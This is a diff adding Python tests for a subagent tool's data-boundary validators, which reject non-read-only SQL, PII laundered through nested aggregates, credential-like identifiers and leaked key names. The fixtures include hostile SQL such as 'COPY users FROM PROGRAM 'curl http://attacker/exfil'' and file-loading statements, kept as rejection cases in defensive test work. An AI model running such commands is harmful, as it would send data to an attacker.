@@ -5305,3 +5305,204 @@ def test_combinator_depth_never_binds_before_the_size_budget() -> None:
     rendered = _canonical_contract_json(_chain(33))
     assert rendered is not None and len(rendered) > 8_000
     assert not _enforceable_lane_contract(_chain(33))
+
+
+def _data_proposal(query: str) -> dict[str, Any]:
+    return {
+        "lane_id": "data_context",
+        "data_needed": True,
+        "finding": "Needs a query.",
+        "confidence": "inferred",
+        "evidence": [],
+        "proposed_queries": [
+            {
+                "tool_name": "warehouse",
+                "query": query,
+                "expected_decision": "n/a",
+                "source_class": "external",
+            }
+        ],
+        "requires_user_confirmation": True,
+    }
+
+
+def test_non_read_only_statement_heads_fail_closed() -> None:
+    """Read-only is classified by statement head, not by mutation blacklist.
+
+    Round-38 probe: ``COPY users FROM PROGRAM 'curl …'`` executes a program
+    and loads rows while matching no mutation shape. A recognized SQL
+    statement must now OPEN with a read-only head; prose proposals and other
+    dialects stay under the confirming human's gate.
+    """
+    from ouroboros.mcp.tools.subagent import _data_evidence_boundary_violations
+
+    for query in (
+        "COPY users FROM PROGRAM 'curl http://attacker/exfil'",
+        "COPY users TO PROGRAM 'curl http://attacker/exfil'",
+        "LOAD DATA INFILE '/tmp/rows.csv' INTO TABLE users",
+        "ATTACH DATABASE '/tmp/other.db' AS other",
+    ):
+        assert any(
+            "not a read-only statement" in error
+            for error in _data_evidence_boundary_violations(_data_proposal(query))
+        ), query
+
+    # Read-only SQL and NATURAL-LANGUAGE proposals must still pass — a false
+    # rejection would block the proposals the lane exists to hand a human.
+    for query in (
+        "SELECT count(*) FROM users",
+        "SHOW TABLES",
+        "EXPLAIN SELECT count(*) FROM users",
+        "Ask the data team for weekly active users from the warehouse",
+        "Load the dashboard from Metabase and read the weekly total",
+        "Call the analytics API for the weekly signup count",
+    ):
+        assert _data_evidence_boundary_violations(_data_proposal(query)) == [], query
+
+
+def test_nested_expression_cannot_launder_pii_aggregate() -> None:
+    """``max(lower(email))`` is still an email (round-38 probe).
+
+    The value-returning aggregate's WHOLE balanced argument is scanned, so a
+    nested call cannot move the identity column out of view. Numeric
+    aggregates still reduce to numbers at any nesting.
+    """
+    from ouroboros.mcp.tools.subagent import _data_evidence_boundary_violations
+
+    for query in (
+        "SELECT max(lower(email)) FROM users",
+        "SELECT max(coalesce(email, phone)) FROM users",
+        "SELECT string_agg(concat(first_name, last_name), ',') FROM users",
+    ):
+        assert any(
+            "raw value" in error
+            for error in _data_evidence_boundary_violations(_data_proposal(query))
+        ), query
+
+    for query in (
+        "SELECT count(email) FROM users",
+        "SELECT max(created_at) FROM users",
+        "SELECT max(count(email)) FROM users GROUP BY plan",
+        "SELECT max(lower(plan)) FROM accounts",
+    ):
+        assert _data_evidence_boundary_violations(_data_proposal(query)) == [], query
+
+
+def test_credential_word_marks_identifier_from_any_position() -> None:
+    """A credential word is a credential word wherever it sits (round-38).
+
+    ``access_key_abcd1234`` wore the identifier exemption because "access"
+    led the name; the classifier now looks for the credential word at ANY
+    token position and applies the same fail-closed suffix rule.
+    """
+    from ouroboros.mcp.tools.subagent import (
+        _data_evidence_boundary_violations,
+        _identifier_looks_secret,
+    )
+
+    for value in (
+        "access_key_abcd1234",
+        "client_secret_9fh2",
+        "refresh_token_abc123XY",
+        # Round 33-37 pins keep holding.
+        "api_key_staging_XYZ12345",
+        "api_key_live_supersecret",
+        "api_key_abcdefghijklmnop",
+    ):
+        assert _identifier_looks_secret(value), value
+
+    for value in (
+        "token_usage_v2",
+        "key_metrics_30d",
+        "token_aggregation_warehouse",
+        "clickhouse_query",
+        "bigquery_keys_daily",
+        "s3_key_prefix_scan",
+    ):
+        assert not _identifier_looks_secret(value), value
+
+    leaked = _minimal_data_output("42 active accounts")
+    leaked["evidence"][0]["source"] = "access_key_abcd1234"
+    assert any("credential" in error for error in _data_evidence_boundary_violations(leaked))
+
+
+def test_violation_paths_never_echo_submitter_chosen_names() -> None:
+    """Violation LOCATIONS are content when the submitter named them.
+
+    Round-38 probe: an additive lane submitting ``{"alice@example.com": …}``
+    produced ``$['alice@example.com']: violates 'type'``, and that address
+    then rode the persisted terminal record. Only property names the CONTRACT
+    declares are echoed.
+    """
+    from ouroboros.mcp.tools.subagent import _lane_answer_contract_violations
+
+    contracts = {
+        "add_lane": {
+            "contract_id": "add.v1",
+            "response_model_schema": {
+                "type": "object",
+                "properties": {"finding": {"type": "string"}},
+                "additionalProperties": {"type": "number"},
+            },
+        }
+    }
+    violations = _lane_answer_contract_violations(
+        contracts, {"add_lane": {"alice@example.com": "secret", "finding": 5}}
+    )
+    errors = violations[0]["errors"]
+    assert not any("alice@example.com" in error for error in errors), errors
+    assert any("<redacted-key sha256:" in error for error in errors), errors
+    # DECLARED names stay readable — the report must still locate the fault.
+    assert any(error.startswith("$.finding:") for error in errors), errors
+
+
+def test_unenforceable_contract_is_not_advertised_in_payload_context(tmp_path: Any) -> None:
+    """Advertised IFF enforced — on the machine-readable surfaces too.
+
+    Round-38 probe: an oversized contract was correctly omitted from the
+    child prompt and from registry enforcement, yet its full form survived
+    under ``payload.context.answer_contract``, so a host reading the payload
+    would follow a form re-entry silently ignores.
+    """
+    from ouroboros.mcp.tools.subagent import (
+        build_interview_question_advisory_subagents,
+        published_lane_contract,
+    )
+
+    oversized = {
+        "contract_id": "oversized.v1",
+        "response_model_schema": {
+            "type": "object",
+            "properties": {
+                f"field_{index}": {"type": "string", "description": "x" * 300}
+                for index in range(60)
+            },
+        },
+    }
+    payloads = build_interview_question_advisory_subagents(
+        {
+            "session_id": "sess-advertise",
+            "question_identity": "interview-question:0123456789abcdef",
+            "question": "Which retention window applies?",
+            "lanes": [
+                {
+                    "lane_id": "additive_lane",
+                    "capability": "future_capability",
+                    "required": False,
+                    "answer_contract": oversized,
+                }
+            ],
+        }
+    )
+    published = payloads[0].to_dict()["context"]["answer_contract"]
+    assert published["enforced"] is False
+    assert "response_model_schema" not in published
+    assert published["contract_id"] == "oversized.v1"
+
+    # An ENFORCEABLE contract is published verbatim — the filter is the
+    # enforceability decision, not a blanket strip.
+    enforceable = {
+        "contract_id": "small.v1",
+        "response_model_schema": {"type": "object", "properties": {"finding": {"type": "string"}}},
+    }
+    assert published_lane_contract(enforceable) == enforceable
